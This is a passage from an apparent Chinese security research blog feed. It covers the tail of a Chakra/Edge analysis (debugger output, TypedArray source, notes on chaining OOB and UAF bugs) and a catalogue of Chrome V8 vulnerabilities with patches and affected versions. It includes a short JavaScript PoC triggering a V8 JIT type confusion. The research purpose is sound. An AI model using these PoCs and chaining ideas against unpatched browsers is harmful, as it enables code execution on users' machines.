class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">0</span>&gt;::TypedArray&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">0</span>&gt;+<span class="number">0xd1</span>:</span><br><span class="line"><span class="number">00007f</span>fa`d2c50f21 e8c6f7ffff call chakra!VirtualTableInfo&lt;Js::TypedArray&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">1</span>&gt; &gt;::SetVirtualTable (<span class="number">00007f</span>fa`d2c506ec)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-065614.jpg" alt=""><br>源码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> TypeName, <span class="keyword">bool</span> clamped, <span class="keyword">bool</span> virtualAllocated&gt;</span><br><span class="line">TypedArray&lt;TypeName, clamped, virtualAllocated&gt;::TypedArray(ArrayBufferBase* arrayBuffer, uint32 byteOffset, uint32 mappedLength, DynamicType* type) :</span><br><span class="line">    TypedArrayBase(arrayBuffer, byteOffset, mappedLength, <span class="keyword">sizeof</span>(TypeName), type)</span><br><span class="line">&#123;</span><br><span class="line">    AssertMsg(arrayBuffer-&gt;GetByteLength() &gt;= byteOffset, <span class="string">"invalid offset"</span>);</span><br><span class="line">    AssertMsg(mappedLength*<span class="keyword">sizeof</span>(TypeName)+byteOffset &lt;= arrayBuffer-&gt;GetByteLength(), <span class="string">"invalid length"</span>);</span><br><span class="line">    <span class="built_in">buffer</span> = arrayBuffer-&gt;GetBuffer() + byteOffset;</span><br><span class="line">    <span class="keyword">if</span> (arrayBuffer-&gt;IsValidVirtualBufferLength(arrayBuffer-&gt;GetByteLength()) &amp;&amp;</span><br><span class="line">         (byteOffset == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">         (mappedLength == (arrayBuffer-&gt;GetByteLength() / <span class="keyword">sizeof</span>(TypeName)))</span><br><span class="line">       )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// update the vtable</span></span><br><span class="line">        <span class="keyword">switch</span> (type-&gt;GetTypeId())</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int8Array:</span><br><span class="line">            VirtualTableInfo&lt;Int8VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint8Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint8VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint8ClampedArray:</span><br><span class="line">            VirtualTableInfo&lt;Uint8ClampedVirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int16Array:</span><br><span class="line">            VirtualTableInfo&lt;Int16VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint16Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint16VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int32Array:</span><br><span class="line">            VirtualTableInfo&lt;Int32VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint32Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint32VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>而Uint32对于0234是为了OOB，对于0236是保留一个指向缓冲区的引用，UAF。</p><p>但是0236的PoC单独使用是没有意义的，因为ClearLength将TypedArray的length清零，无法控制内存。<br>但是通过0234的JIT优化，去掉了边界检查，从而可以修改缓冲区，发挥UAF的威力。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>我觉得必要条件和充分条件是很有趣和有用的想法。<br>这其中还有一种对抗与脆弱性的思维在里面，一个有价值的漏洞引入的很可能不是一个地方有问题，而是类似实现的地方都有问题，通过这个poc可以触发，patch之后能不能找到类似的实现或者因为没有补全找到更多触发，甚至由于patch的不好引发新的安全问题，都有可能。<br>除此之外，将漏洞联系起来看，而不是单纯的去看一个OOB或者单纯一个UAF，能够更深入的思考漏洞的本质，找到更多利用的想法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;h3 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="edge" scheme="http://eternalsakura13.com/tags/edge/"/>
    
  </entry>
  
  <entry>
    <title>Vulnerabilities from Chrome</title>
    <link href="http://eternalsakura13.com/2018/07/23/Vulnerabilities/"/>
    <id>http://eternalsakura13.com/2018/07/23/Vulnerabilities/</id>
    <published>2018-07-22T18:24:46.389Z</published>
    <updated>2018-10-22T14:25:51.721Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h1><h2 id="Bugs-715582"><a href="#Bugs-715582" class="headerlink" title="Bugs:715582"></a>Bugs:715582</h2><ul><li>Security: Out of bound read in FindSharedFunctionInfo (V8)<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=715582" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=715582</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/4e78b5a70c6443e3829b0bef10fd731062e27aa3" target="_blank" rel="noopener">https://github.com/v8/v8/commit/4e78b5a70c6443e3829b0bef10fd731062e27aa3</a></li><li>影响版本：</li></ul><p>6.0.92及以下</p><ul><li>note<br>和AST遍历访问有关，比较特别，mark一下</li></ul><h2 id="Bugs-732169"><a href="#Bugs-732169" class="headerlink" title="Bugs:732169"></a>Bugs:732169</h2><ul><li>Ill in v8::internal::TranslatedState::MaterializeCapturedObjectAt<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=732169" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=732169</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/f555a6922dd1b425ed845370cd01428b3ba46f93" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f555a6922dd1b425ed845370cd01428b3ba46f93</a></li><li>影响版本</li></ul><p>6.1.131及以下</p><h2 id="CVE-2017-5115-Bugs-744584"><a href="#CVE-2017-5115-Bugs-744584" class="headerlink" title="CVE-2017-5115/Bugs:744584"></a>CVE-2017-5115/Bugs:744584</h2><ul><li>Bugs in type inference when replacing EffectPhi with Phi<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=744584" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=744584</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a224eff455632df89377748421a23be47a5278e8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a224eff455632df89377748421a23be47a5278e8</a></li><li>影响版本</li></ul><p>6.2.0及以下</p><h2 id="Bugs-746946"><a href="#Bugs-746946" class="headerlink" title="Bugs:746946"></a>Bugs:746946</h2><ul><li>Security: Chrome Type Confusion leads to Code Execution<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=746946" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=746946</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a</a></li><li>note<br>这个洞我只是看到给了个exp，所以说记录一下，其实没什么可看的</li></ul><h2 id="Bugs-752149"><a href="#Bugs-752149" class="headerlink" title="Bugs:752149"></a>Bugs:752149</h2><ul><li>Security: Arbitrary bad cast in optimized Javascript code<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=752149" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=752149</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/1d92fd2edf771d4d5739dd473f8614af87f722f8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/1d92fd2edf771d4d5739dd473f8614af87f722f8</a></li><li>影响版本</li></ul><p>6.2.170及以下</p><h2 id="Bugs-757199"><a href="#Bugs-757199" class="headerlink" title="Bugs:757199"></a>Bugs:757199</h2><ul><li>DCHECK failure in result-&gt;owns_descriptors() in objects.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=757199" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=757199</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/8a7ce927a685d4007e02298881d85c7d5f273777" target="_blank" rel="noopener">https://github.com/v8/v8/commit/8a7ce927a685d4007e02298881d85c7d5f273777</a></li><li>影响版本</li></ul><p>6.2.363及以下</p><h2 id="Bugs-765433"><a href="#Bugs-765433" class="headerlink" title="Bugs:765433"></a>Bugs:765433</h2><ul><li>Security: V8 JIT escape analysis bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=765433" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=765433</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/40a9eabc44204c353dce4bec08e8bd87b3fc0cc7" target="_blank" rel="noopener">https://github.com/v8/v8/commit/40a9eabc44204c353dce4bec08e8bd87b3fc0cc7</a><br>这是我们从那以后完全重写的旧逃逸分析中的一个错误。<br>好消息是，这是通过新的逃逸分析来解决的，坏消息是旧的逃逸分析已经消失，因此无法修复其中的错误。唯一可靠的方法似乎是禁用6.1中的逃逸分析。</li></ul><h2 id="Bugs-762874"><a href="#Bugs-762874" class="headerlink" title="Bugs:762874"></a>Bugs:762874</h2><ul><li>Security: off by one in TurboFan range optimization for String.indexOf<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=762874" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=762874</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/b8f144ec4fd1cd808f0d883668f355498b56d7fa" target="_blank" rel="noopener">https://github.com/v8/v8/commit/b8f144ec4fd1cd808f0d883668f355498b56d7fa</a></li><li>影响版本</li></ul><p>6.3.97及以下</p><h2 id="Bugs-772420"><a href="#Bugs-772420" class="headerlink" title="Bugs:772420"></a>Bugs:772420</h2><ul><li>DCHECK failure in right_type()-&gt;Is(Type::PlainPrimitive()) in js-typed-lowering.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=772420" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=772420</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a</a></li><li>影响版本</li></ul><p>6.4.32及以下</p><h2 id="Bugs-776677"><a href="#Bugs-776677" class="headerlink" title="Bugs:776677"></a>Bugs:776677</h2><ul><li>Security: V8:Use After Free Leads to Remote Code Execution(有exp)<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=776677" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=776677</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/5f960dfc06a7c95af69e2b09f772b2280168469b" target="_blank" rel="noopener">https://github.com/v8/v8/commit/5f960dfc06a7c95af69e2b09f772b2280168469b</a></li><li>影响版本</li></ul><p>6.4.91及以下</p><h2 id="Bugs-784533"><a href="#Bugs-784533" class="headerlink" title="Bugs:784533"></a>Bugs:784533</h2><ul><li>DCHECK failure in IsTyped(node) in node-properties.h<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=784533" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=784533</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/ebe6d7a97f962c18595a2a1efaa93fa1c5ede604" target="_blank" rel="noopener">https://github.com/v8/v8/commit/ebe6d7a97f962c18595a2a1efaa93fa1c5ede604</a></li><li>影响版本</li></ul><p>6.4.289及以下</p><h2 id="Bugs-788539"><a href="#Bugs-788539" class="headerlink" title="Bugs:788539"></a>Bugs:788539</h2><ul><li>CHECK failure: frame_state-&gt;opcode() == IrOpcode::kFrameState || (node-&gt;opcode() == IrOpcode::k<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=788539" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=788539</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/904c3a1f091d3ff6f19451fced343392a5ec944a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/904c3a1f091d3ff6f19451fced343392a5ec944a</a></li><li>影响版本</li></ul><p>6.4.376及以下</p><h2 id="Bugs-787910"><a href="#Bugs-787910" class="headerlink" title="Bugs:787910"></a>Bugs:787910</h2><ul><li>Use-after-poison in parameter_count<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=787910" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=787910</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/0bc1b967f2b91779abf1f5b209ac1b4114dfe4c6" target="_blank" rel="noopener">https://github.com/v8/v8/commit/0bc1b967f2b91779abf1f5b209ac1b4114dfe4c6</a></li><li>影响版本</li></ul><p>6.4.363及以下</p><h2 id="Bugs-791245"><a href="#Bugs-791245" class="headerlink" title="Bugs:791245"></a>Bugs:791245</h2><ul><li>Security: V8: JIT: Simplified-lowererer IrOpcode::kStoreField, IrOpcode::kStoreElement optimization bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791245" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=791245</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/cc07ac73a460de3d933ebe7aebf0f55b741eb5cf" target="_blank" rel="noopener">https://github.com/v8/v8/commit/cc07ac73a460de3d933ebe7aebf0f55b741eb5cf</a></li><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8/+/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e%5E%21/#F0" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e%5E%21/#F0</a><br><a href="https://github.com/v8/v8/commit/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e</a></li><li>影响版本</li></ul><p>6.1.75-6.5.6</p><h2 id="Bugs-791953"><a href="#Bugs-791953" class="headerlink" title="Bugs:791953"></a>Bugs:791953</h2><ul><li>CHECK failure: NumberToUint32 of kRepWord32 (Range(1, NUMBER)) cannot be changed to kRepTaggedS<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791953" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=791953</a></li><li>patch<br>还没找到</li></ul><h2 id="Bugs-794394"><a href="#Bugs-794394" class="headerlink" title="Bugs:794394"></a>Bugs:794394</h2><ul><li>Security: V8: JIT: JSBuiltinReducer::ReduceObjectCreate fails to ensure that the prototype is “null”<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794394" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794394</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a90503d8a9526f9a3e3df4e24e68c8aea1c74f14" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a90503d8a9526f9a3e3df4e24e68c8aea1c74f14</a></li><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2</a></li><li>影响版本</li></ul><p>5.7.447-6.5.67</p><h2 id="Bugs-794822"><a href="#Bugs-794822" class="headerlink" title="Bugs:794822"></a>Bugs:794822</h2><ul><li>Chrome: V8: JIT: Type confusion in GetSpecializationContext<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794822" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794822</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/649ab060c05bc40db696c74ca9ac95093ef9b433" target="_blank" rel="noopener">https://github.com/v8/v8/commit/649ab060c05bc40db696c74ca9ac95093ef9b433</a></li><li>影响版本</li></ul><p>6.5.71及以下</p><h2 id="Bugs-797596"><a href="#Bugs-797596" class="headerlink" title="Bugs:797596"></a>Bugs:797596</h2><ul><li>DCHECK failure in IrOpcode::kMerge == control-&gt;opcode() in node-properties.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=797596" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=797596</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/007f90ba9b331e4d3a8186799b098bec9b521b0a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/007f90ba9b331e4d3a8186799b098bec9b521b0a</a></li><li>影响版本</li></ul><p>6.5.107及以下</p><h2 id="Bugs-794405-794359"><a href="#Bugs-794405-794359" class="headerlink" title="Bugs:794405/794359"></a>Bugs:794405/794359</h2><ul><li><p>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794405" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794405</a></p></li><li><p>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794359" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794359</a></p></li></ul><h2 id="Bugs-799263"><a href="#Bugs-799263" class="headerlink" title="Bugs:799263"></a>Bugs:799263</h2><ul><li>Chrome: V8: JIT: A bug in LoadElimination::ReduceTransitionElementsKind<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=799263" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=799263</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/9884bc5dee488bf206655f07b8a487afef4ded9b" target="_blank" rel="noopener">https://github.com/v8/v8/commit/9884bc5dee488bf206655f07b8a487afef4ded9b</a></li><li>影响版本</li></ul><p>6.4.66-6.5.143</p><ul><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8.git/+/9884bc5dee488bf206655f07b8a487afef4ded9b" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8.git/+/9884bc5dee488bf206655f07b8a487afef4ded9b</a></li></ul><h2 id="Bugs-797130"><a href="#Bugs-797130" class="headerlink" title="Bugs:797130"></a>Bugs:797130</h2><ul><li>DCHECK failure in min_block == BasicBlock::GetCommonDominator(block, min_block) in scheduler.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=797130" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=797130</a></li><li>patch没找到</li></ul><h2 id="Bugs-801627"><a href="#Bugs-801627" class="headerlink" title="Bugs:801627"></a>Bugs:801627</h2><ul><li>V8: JIT: Type confusion in NodeProperties::InferReceiverMaps<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=801627" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=801627</a><br><a href="https://cs.chromium.org/chromium/src/v8/src/compiler/node-properties.cc?rcl=df84e87191022bf6914f9570069908f10b303245&amp;l=416" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/src/compiler/node-properties.cc?rcl=df84e87191022bf6914f9570069908f10b303245&amp;l=416</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/e272a2f722422651cf5bbbe0168702ee5d38cfe8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/e272a2f722422651cf5bbbe0168702ee5d38cfe8</a></li><li>影响版本<br>v6.5.198及以下几个版本</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Here<span class="number">'</span>s a snippet of NodeProperties::InferReceiverMaps.</span><br><span class="line">      <span class="keyword">case</span> IrOpcode::kJSCreate: &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsSame(receiver, effect)) &#123;</span><br><span class="line">          <span class="function">HeapObjectMatcher <span class="title">mtarget</span><span class="params">(GetValueInput(effect, <span class="number">0</span>))</span></span>;</span><br><span class="line">          <span class="function">HeapObjectMatcher <span class="title">mnewtarget</span><span class="params">(GetValueInput(effect, <span class="number">1</span>))</span></span>;</span><br><span class="line">          <span class="keyword">if</span> (mtarget.HasValue() &amp;&amp; mnewtarget.HasValue()) &#123;</span><br><span class="line">            Handle&lt;JSFunction&gt; original_constructor =</span><br><span class="line">                Handle&lt;JSFunction&gt;::cast(mnewtarget.Value());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (original_constructor-&gt;has_initial_map()) &#123;</span><br><span class="line">              <span class="function">Handle&lt;Map&gt; <span class="title">initial_map</span><span class="params">(original_constructor-&gt;initial_map())</span></span>;</span><br><span class="line">              <span class="keyword">if</span> (initial_map-&gt;constructor_or_backpointer() ==</span><br><span class="line">                  *mtarget.Value()) &#123;</span><br><span class="line">                *maps_return = ZoneHandleSet&lt;Map&gt;(initial_map);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// We reached the allocation of the &#123;receiver&#125;.</span></span><br><span class="line">          <span class="keyword">return</span> kNoReceiverMaps;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>“mnewtarget” is expected to be a constructor which also can be of type JSBoundFunction. But “mnewtarget” is always cast to JSFunction which leads to type confusion.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PoC:</span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax --enable_slow_asserts</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.x = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="comment">// JSCreate emitted I guess.</span></span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bound = <span class="built_in">Object</span>.bind();</span><br><span class="line"><span class="built_in">Reflect</span>.construct(Derived, [], bound);  <span class="comment">// Feed a bound function as new.target to the profiler, so HeapObjectMatcher can find it.</span></span><br><span class="line"></span><br><span class="line">%OptimizeFunctionOnNextCall(Derived);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Derived();</span><br></pre></td></tr></table></figure><h2 id="Bugs-802060"><a href="#Bugs-802060" class="headerlink" title="Bugs:802060"></a>Bugs:802060</h2><ul><li>DCHECK failure in op-&gt;IsAnyLocationOperand() in instruction.h<br>bug in x64 immediate operand handling for smi-converting loads<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=802060" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=802060</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/9ef2ed308522d86ea93cd5a39bd4e188a5ae4f02" target="_blank" rel="noopener">https://github.com/v8/v8/commit/9ef2ed308522d86ea93cd5a39bd4e188a5ae4f02</a></li><li>影响版本</li></ul><p>6.6.136及以下</p><ul><li>note<br>看不懂2333</li></ul><h2 id="Bugs-802333"><a href="#Bugs-802333" class="headerlink" title="Bugs:802333"></a>Bugs:802333</h2><ul><li>Security: V8: A bug in the ObjectDescriptor class<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=802333" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=802333</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/e416e3c475ef8bd76455dbd9dd416e7edfe56893" target="_blank" rel="noopener">https://github.com/v8/v8/commit/e416e3c475ef8bd76455dbd9dd416e7edfe56893</a></li><li>影响版本</li></ul><p>6.6.85及以下</p><h2 id="Bugs-803022"><a href="#Bugs-803022" class="headerlink" title="Bugs:803022"></a>Bugs:803022</h2><ul><li>DCHECK failure in current_ == next_ in node.h<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=803022" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=803022</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/b71133245c24149786942793ce3fa1462e9b02d9" target="_blank" rel="noopener">https://github.com/v8/v8/commit/b71133245c24149786942793ce3fa1462e9b02d9</a></li><li>影响版本</li></ul><p>6.6.45及以下</p><h2 id="Bug-chromium-804801"><a href="#Bug-chromium-804801" class="headerlink" title="Bug: chromium:804801"></a>Bug: chromium:804801</h2><ul><li>CHECK failure: Type cast failed in CAST(add_func) at ../../src/builtins/builtins-collections-ge<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=804801" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=804801</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/c0a6e85153f148f051b6e3d90de8a3f1bf59fc69" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c0a6e85153f148f051b6e3d90de8a3f1bf59fc69</a></li><li>影响版本</li></ul><p>6.6.54及以下</p><h2 id="Bugs-804837"><a href="#Bugs-804837" class="headerlink" title="Bugs:804837"></a>Bugs:804837</h2><ul><li>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=804837" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=804837</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a9796a1d27185fdd8dc2c70d45712dc62c35f301" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a9796a1d27185fdd8dc2c70d45712dc62c35f301</a></li><li>影响版本</li></ul><p>6.6.45及以下</p><h2 id="Bugs-818144"><a href="#Bugs-818144" class="headerlink" title="Bugs:818144"></a>Bugs:818144</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=818144" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=818144</a><br>没找到patch</p><h2 id="Bugs-818811"><a href="#Bugs-818811" class="headerlink" title="Bugs:818811"></a>Bugs:818811</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=818811" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=818811</a><br>没找到patch</p><h2 id="Bugs-819311"><a href="#Bugs-819311" 